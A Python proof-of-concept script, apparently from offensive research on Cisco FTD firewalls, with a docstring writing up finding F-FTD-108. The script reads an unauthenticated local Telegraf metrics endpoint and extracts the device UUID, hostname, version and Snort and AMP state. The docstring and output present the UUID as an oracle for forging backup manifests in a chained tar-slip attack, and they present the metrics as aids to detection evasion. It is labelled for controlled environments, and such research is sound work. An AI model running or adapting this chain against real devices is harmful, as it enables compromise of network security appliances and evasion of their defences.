"""
F-FTD-108: Unauthenticated Telegraf/Prometheus metrics on FTD port 9273
CONTROLLED ENVIRONMENT ONLY

Root cause:
  FTD runs Telegraf (go-metrics Prometheus exporter) bound to 127.0.0.1:9273.
  No authentication required — any local process (or user with loopback access)
  can read the full metrics endpoint.

  The /metrics endpoint exposes Prometheus-format time-series covering:
    - Device identity: uuid, hostname, version labels on ALL metric families
    - AMP cloud connectivity state (amp_cloud_state)
    - ASP (Accelerated Security Path) drop counters
    - Connection table statistics
    - Snort engine state and packet drop rates
    - XTLS/VPN counters
    - Interface statistics
    - CPU/memory utilization

  Device UUID extraction (critical for F-FTD-107 manifest forgery):
    The device UUID appears as a label on every metric line:
      ngfw_cpu_usage{uuid="2fe3bd28-9c3b-11f1-8c75-98cd2be24485",...} 12.5
    This UUID must match the target device's UUID in the backup manifest
    for RestoreImmediateJob.isValidBackupManifestFile() to accept the archive.
    Without this finding, an attacker must guess or brute-force the UUID.

  Live example (FTD 7.0.0-94 lab):
    uuid = "2fe3bd28-9c3b-11f1-8c75-98cd2be24485"
    Endpoint: http://127.0.0.1:9273/metrics
    No auth headers, no TLS.

Attack chain:
  F-FTD-108 (device UUID) → F-FTD-107 (valid backup manifest with correct UUID)
  F-FTD-108 (AMP cloud state) → operational intelligence for evasion timing
  F-FTD-108 (Snort drop rates, ASP stats) → traffic-shaping / detection-evasion metrics

Severity: MEDIUM
  Requires: local process execution or loopback access (F-FTD-105 / AJP)
  Impact: device UUID leak (elevates F-FTD-107 to no-UUID-guessing required);
          operational metrics for OPSEC decisions
  Standalone: low — more significant as UUID oracle for F-FTD-107 chain

References:
  Live observation: curl http://127.0.0.1:9273/metrics from FTD admin shell
  UUID used in: RestoreImmediateJob.isValidBackupManifestFile() UUID comparison
  Telegraf config: /etc/sf/telegraf.conf (or /ngfw/etc/sf/telegraf.conf)
  FTD 6.7.0-65: same port confirmed by netstat (-tlnp 9273)
  FTD 7.0.0-94: uuid label confirmed on all metric families
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import re
import sys
import urllib.request

FINDING = "F-FTD-108"
LABEL = "Unauthenticated Telegraf/Prometheus metrics leak — device UUID oracle"

METRICS_PORT = 9273
METRICS_ENDPOINT = "/metrics"
DEFAULT_HOST = "127.0.0.1"

# Metric families of interest for F-FTD-108
METRIC_PATTERNS = {
    "uuid": re.compile(r'uuid="([^"]+)"'),
    "hostname": re.compile(r'hostname="([^"]+)"'),
    "version": re.compile(r'version="([^"]+)"'),
    "amp_cloud_state": re.compile(r'^ngfw_amp_cloud_state\{[^}]+\}\s+(\S+)', re.M),
    "snort_drop_pct": re.compile(r'^ngfw_snort_drop_pct\{[^}]+\}\s+(\S+)', re.M),
    "cpu_usage": re.compile(r'^ngfw_cpu_usage\{[^}]+\}\s+(\S+)', re.M),
    "connections_active": re.compile(r'^ngfw_connections_active\{[^}]+\}\s+(\S+)', re.M),
}


def fetch_metrics(host: str, port: int) -> str:
    url = f"http://{host}:{port}{METRICS_ENDPOINT}"
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        print(f"[-] Cannot reach {url}: {e}")
        return ""
    except Exception as e:
        print(f"[-] Error: {e}")
        return ""


def parse_metrics(content: str) -> dict:
    result = {}
    for key, pattern in METRIC_PATTERNS.items():
        m = pattern.search(content)
        if m:
            result[key] = m.group(1)
    # Count total metric families
    families = set(re.findall(r'^#\s+HELP\s+(\S+)', content, re.M))
    result["metric_families"] = sorted(families)
    result["total_lines"] = len(content.splitlines())
    return result


def extract_all_labels(content: str) -> dict:
    """Extract all unique label key/value pairs across all metrics."""
    labels = {}
    for m in re.finditer(r'(\w+)="([^"]*)"', content):
        k, v = m.group(1), m.group(2)
        if k not in labels:
            labels[k] = set()
        labels[k].add(v)
    return {k: sorted(v) for k, v in labels.items()}


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target host (default: {DEFAULT_HOST} — loopback/AJP access required)")
    ap.add_argument("--port", type=int, default=METRICS_PORT,
                    help=f"Telegraf metrics port (default: {METRICS_PORT})")
    ap.add_argument("--dump", action="store_true",
                    help="Dump full metrics text to stdout")
    ap.add_argument("--uuid-only", action="store_true",
                    help="Print only the device UUID (for scripting with F-FTD-107)")
    args = ap.parse_args()

    if not args.uuid_only:
        print(f"[*] {FINDING}: {LABEL}")
        print("[!] CONTROLLED ENVIRONMENT ONLY")
        print()
        print(f"[1] Fetching Telegraf metrics from http://{args.host}:{args.port}{METRICS_ENDPOINT}...")

    content = fetch_metrics(args.host, args.port)
    if not content:
        sys.exit(1)

    if args.uuid_only:
        m = METRIC_PATTERNS["uuid"].search(content)
        if m:
            print(m.group(1))
        else:
            sys.exit(1)
        return

    parsed = parse_metrics(content)
    labels = extract_all_labels(content)

    print(f"[+] FINDING CONFIRMED: Telegraf metrics accessible without authentication")
    print(f"    {parsed['total_lines']} lines, {len(parsed['metric_families'])} metric families")
    print()
    print(f"[+] Device identity (extracted from metric labels):")
    for key in ("uuid", "hostname", "version"):
        val = parsed.get(key, "<not found>")
        print(f"      {key:20s}: {val}")

    print()
    print(f"[+] Operational metrics:")
    for key in ("amp_cloud_state", "snort_drop_pct", "cpu_usage", "connections_active"):
        val = parsed.get(key, "<not found>")
        print(f"      {key:25s}: {val}")

    print()
    print(f"[+] All label keys observed: {', '.join(sorted(labels.keys()))}")

    if parsed.get("uuid"):
        print()
        print(f"[!] UUID oracle for F-FTD-107 manifest forgery:")
        print(f"    Use this UUID in the backup manifest to pass isValidBackupManifestFile() check:")
        print(f"    python3 ftd_backup_tarslip.py --device-uuid {parsed['uuid']} ...")

    print()
    print(f"[+] Metric families:")
    for fam in parsed["metric_families"]:
        print(f"      {fam}")

    if args.dump:
        print()
        print("=== FULL METRICS DUMP ===")
        print(content)


if __name__ == "__main__":
    main()
